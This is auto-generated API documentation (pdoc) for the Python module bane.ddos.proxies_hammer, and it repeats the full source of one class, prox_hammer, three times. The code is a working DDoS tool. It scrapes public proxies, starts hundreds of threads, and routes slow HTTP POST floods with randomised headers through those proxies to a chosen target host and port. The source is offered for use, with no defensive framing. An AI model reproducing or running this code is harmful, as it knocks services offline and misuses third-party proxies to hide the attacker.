<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>bane.ddos.proxies_hammer</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">from bane.ddos.utils import *

class prox_hammer(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        cookie=None,
        user_agents=None,
        threads_daemon=True,
        scraping_timeout=15,
        max_content=15000,
        min_content=10000,
        threads=700,
        timeout=5,
        http_list=None,
        socks4_list=None,
        socks5_list=None,
        duration=60,
        logs=True,
    ):
        self.cookie = cookie
        self.user_agents = user_agents
        if not self.user_agents or len(self.user_agents) == 0:
            self.user_agents = ua
        self.httplist = http_list
        if not self.httplist and self.httplist != []:
            self.httplist = proxyscrape(timeout=scraping_timeout)
        self.socks4list = socks4_list
        if not self.socks4list and self.socks4list != []:
            self.socks4list = proxyscrape(protocol=&#39;socks4&#39;,timeout=scraping_timeout)
        self.socks5list = socks5_list
        if not self.socks5list and self.socks5list != []:
            self.socks5list = proxyscrape(protocol=&#39;socks5&#39;,timeout=scraping_timeout)
        self.stop = False
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.max_content = max_content
        self.min_content = min_content
        self.logs = logs
        self.counter = 0
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) &gt;= self.duration
                ):  # this is a safety mechanism so the attack won&#39;t run forever
                    break
                if self.stop == True:
                    break
                try:
                    bot_type = []
                    if len(self.httplist) &gt; 0:
                        bot_type.append(&#34;h&#34;)
                    if len(self.socks4list) &gt; 0:
                        bot_type.append(&#34;s4&#34;)
                    if len(self.socks5list) &gt; 0:
                        bot_type.append(&#34;s5&#34;)
                    z = random.choice(bot_type)
                    if z == &#34;h&#34;:
                        line = random.choice(self.httplist)
                    elif z == &#34;s4&#34;:
                        line = random.choice(self.socks4list)
                    elif z == &#34;s5&#34;:
                        line = random.choice(self.socks5list)
                    ipp = line.split(&#34;:&#34;)[0].split(&#34;=&#34;)[0]
                    pp = line.split(&#34;:&#34;)[1].split(&#34;=&#34;)[0]
                    s = socks.socksocket()
                    if z == &#34;h&#34;:
                        s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
                    elif z == &#34;s4&#34;:
                        s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
                    elif z == &#34;s5&#34;:
                        s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
                    if z == &#34;h&#34;:
                        s.settimeout(self.timeout)
                    s.connect((self.target, self.port))
                    self.counter += 1
                    if (self.port == 443) or (self.port == 8443):
                        s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
                    q = random.randint(self.min_content, self.max_content)
                    ck = &#34;&#34;
                    if self.cookie:
                        ck = &#34;Cookie: &#34; + self.cookie + &#34;\r\n&#34;
                    s.send(
                        reorder_headers_randomly(
                            &#34;POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n&#34;.format(
                                random.choice(paths),
                                ck,
                                random.choice(self.user_agents),
                                random.randint(300, 1000),
                                q,
                                (
                                    random.choice(referers)
                                    + random.choice(lis)
                                    + str(random.randint(0, 100000000))
                                    + random.choice(lis)
                                ),
                                self.target,
                            )
                        ).encode(&#34;utf-8&#34;)
                    )
                    for i in range(q):
                        if (
                            int(time.time() - self.start) &gt;= self.duration
                        ):  # this is a safety mechanism so the attack won&#39;t run forever
                            break
                        if self.stop == True:
                            break
                        h = random.choice(lis)
                        try:
                            s.send(h.encode(&#34;utf-8&#34;))
                            if self.logs == True:
                                sys.stdout.write(&#34;\rPosted: {} --&gt; {}&#34;.format(h, ipp))
                                sys.stdout.flush()
                                # print(&#34;Posted: {} --&gt; {}&#34;.format(h,ipp))
                            time.sleep(random.uniform(0.1, 3))
                        except:
                            break
                    s.close()
                except:
                    pass
                self.counter -= 1
                time.sleep(0.1)
            self.kill()
        except:
            pass</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
</section>
<section>
<h2 class="section-title" id="header-classes">Classes</h2>
<dl>
<dt id="bane.ddos.proxies_hammer.prox_hammer"><code class="flex name class">
<span>class <span class="ident">prox_hammer</span></span>
<span>(</span><span>u, p=80, cookie=None, user_agents=None, threads_daemon=True, scraping_timeout=15, max_content=15000, min_content=10000, threads=700, timeout=5, http_list=None, socks4_list=None, socks5_list=None, duration=60, logs=True)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">class prox_hammer(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        cookie=None,
        user_agents=None,
        threads_daemon=True,
        scraping_timeout=15,
        max_content=15000,
        min_content=10000,
        threads=700,
        timeout=5,
        http_list=None,
        socks4_list=None,
        socks5_list=None,
        duration=60,
        logs=True,
    ):
        self.cookie = cookie
        self.user_agents = user_agents
        if not self.user_agents or len(self.user_agents) == 0:
            self.user_agents = ua
        self.httplist = http_list
        if not self.httplist and self.httplist != []:
            self.httplist = proxyscrape(timeout=scraping_timeout)
        self.socks4list = socks4_list
        if not self.socks4list and self.socks4list != []:
            self.socks4list = proxyscrape(protocol=&#39;socks4&#39;,timeout=scraping_timeout)
        self.socks5list = socks5_list
        if not self.socks5list and self.socks5list != []:
            self.socks5list = proxyscrape(protocol=&#39;socks5&#39;,timeout=scraping_timeout)
        self.stop = False
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.max_content = max_content
        self.min_content = min_content
        self.logs = logs
        self.counter = 0
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) &gt;= self.duration
                ):  # this is a safety mechanism so the attack won&#39;t run forever
                    break
                if self.stop == True:
                    break
                try:
                    bot_type = []
                    if len(self.httplist) &gt; 0:
                        bot_type.append(&#34;h&#34;)
                    if len(self.socks4list) &gt; 0:
                        bot_type.append(&#34;s4&#34;)
                    if len(self.socks5list) &gt; 0:
                        bot_type.append(&#34;s5&#34;)
                    z = random.choice(bot_type)
                    if z == &#34;h&#34;:
                        line = random.choice(self.httplist)
                    elif z == &#34;s4&#34;:
                        line = random.choice(self.socks4list)
                    elif z == &#34;s5&#34;:
                        line = random.choice(self.socks5list)
                    ipp = line.split(&#34;:&#34;)[0].split(&#34;=&#34;)[0]
                    pp = line.split(&#34;:&#34;)[1].split(&#34;=&#34;)[0]
                    s = socks.socksocket()
                    if z == &#34;h&#34;:
                        s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
                    elif z == &#34;s4&#34;:
                        s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
                    elif z == &#34;s5&#34;:
                        s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
                    if z == &#34;h&#34;:
                        s.settimeout(self.timeout)
                    s.connect((self.target, self.port))
                    self.counter += 1
                    if (self.port == 443) or (self.port == 8443):
                        s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
                    q = random.randint(self.min_content, self.max_content)
                    ck = &#34;&#34;
                    if self.cookie:
                        ck = &#34;Cookie: &#34; + self.cookie + &#34;\r\n&#34;
                    s.send(
                        reorder_headers_randomly(
                            &#34;POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n&#34;.format(
                                random.choice(paths),
                                ck,
                                random.choice(self.user_agents),
                                random.randint(300, 1000),
                                q,
                                (
                                    random.choice(referers)
                                    + random.choice(lis)
                                    + str(random.randint(0, 100000000))
                                    + random.choice(lis)
                                ),
                                self.target,
                            )
                        ).encode(&#34;utf-8&#34;)
                    )
                    for i in range(q):
                        if (
                            int(time.time() - self.start) &gt;= self.duration
                        ):  # this is a safety mechanism so the attack won&#39;t run forever
                            break
                        if self.stop == True:
                            break
                        h = random.choice(lis)
                        try:
                            s.send(h.encode(&#34;utf-8&#34;))
                            if self.logs == True:
                                sys.stdout.write(&#34;\rPosted: {} --&gt; {}&#34;.format(h, ipp))
                                sys.stdout.flush()
                                # print(&#34;Posted: {} --&gt; {}&#34;.format(h,ipp))
                            time.sleep(random.uniform(0.1, 3))
                        except:
                            break
                    s.close()
                except:
                    pass
                self.counter -= 1
                time.sleep(0.1)
            self.kill()
        except:
            pass</code></pre>
</details>
<h3>Ancestors</h3>
<ul class="hlist">
<li><a title="bane.ddos.utils.DDoS_Class" href="utils.html#bane.ddos.utils.DDoS_Class">DDoS_Class</a></li>
</ul>
<h3>Methods</h3>
<dl>
<dt id="bane.ddos.proxies_hammer.prox_hammer.attack"><code class="name flex">
<span>def <span class="ident">attack</span></span>(<span>self)</span>
</code></dt>
<dd>
<div class="desc"></div>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def attack(self):
    try:
        time.sleep(1)
        while True:
            if (
                int(time.time() - self.start) &gt;= self.duration
            ):  # this is a safety mechanism so the attack won&#39;t run forever
                break
            if self.stop == True:
                break
            try:
                bot_type = []
                if len(self.httplist) &gt; 0:
                    bot_type.append(&#34;h&#34;)
                if len(self.socks4list) &gt; 0:
                    bot_type.append(&#34;s4&#34;)
                if len(self.socks5list) &gt; 0:
                    bot_type.append(&#34;s5&#34;)
                z = random.choice(bot_type)
                if z == &#34;h&#34;:
                    line = random.choice(self.httplist)
                elif z == &#34;s4&#34;:
                    line = random.choice(self.socks4list)
                elif z == &#34;s5&#34;:
                    line = random.choice(self.socks5list)
                ipp = line.split(&#34;:&#34;)[0].split(&#34;=&#34;)[0]
                pp = line.split(&#34;:&#34;)[1].split(&#34;=&#34;)[0]
                s = socks.socksocket()
                if z == &#34;h&#34;:
                    s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
                elif z == &#34;s4&#34;:
                    s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
                elif z == &#34;s5&#34;:
                    s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
                if z == &#34;h&#34;:
                    s.settimeout(self.timeout)
                s.connect((self.target, self.port))
                self.counter += 1
                if (self.port == 443) or (self.port == 8443):
                    s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
                q = random.randint(self.min_content, self.max_content)
                ck = &#34;&#34;
                if self.cookie:
                    ck = &#34;Cookie: &#34; + self.cookie + &#34;\r\n&#34;
                s.send(
                    reorder_headers_randomly(
                        &#34;POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n&#34;.format(
                            random.choice(paths),
                            ck,
                            random.choice(self.user_agents),
                            random.randint(300, 1000),
                            q,
                            (
                                random.choice(referers)
                                + random.choice(lis)
                                + str(random.randint(0, 100000000))
                                + random.choice(lis)
                            ),
                            self.target,
                        )
                    ).encode(&#34;utf-8&#34;)
                )
                for i in range(q):
                    if (
                        int(time.time() - self.start) &gt;= self.duration
                    ):  # this is a safety mechanism so the attack won&#39;t run forever
                        break
                    if self.stop == True:
                        break
                    h = random.choice(lis)
                    try:
                        s.send(h.encode(&#34;utf-8&#34;))
                        if self.logs == True:
                            sys.stdout.write(&#34;\rPosted: {} --&gt; {}&#34;.format(h, ipp))
                            sys.stdout.flush()
                            # print(&#34;Posted: {} --&gt; {}&#34;.format(h,ipp))
                        time.sleep(random.uniform(0.1, 3))
                    except:
                        break
                s.close()
            except:
                pass
            self.counter -= 1
            time.sleep(0.1)
        self.kill()
    except:
        pass</code></pre>
</details>
</dd>
</dl>
</dd>
</dl>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="bane.ddos" href="index.md">bane.ddos</a></code></li>
</ul>
</li>
<li><h3><a href="#header-classes">Classes</a></h3>
<ul>
<li>
<h4><code><a title="bane.ddos.proxies_hammer.prox_hammer" href="#bane.ddos.proxies_hammer.prox_hammer">prox_hammer</a></code></h4>
<ul class="">
<li><code><a title="bane.ddos.proxies_hammer.prox_hammer.attack" href="#bane.ddos.proxies_hammer.prox_hammer.attack">attack</a></code></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>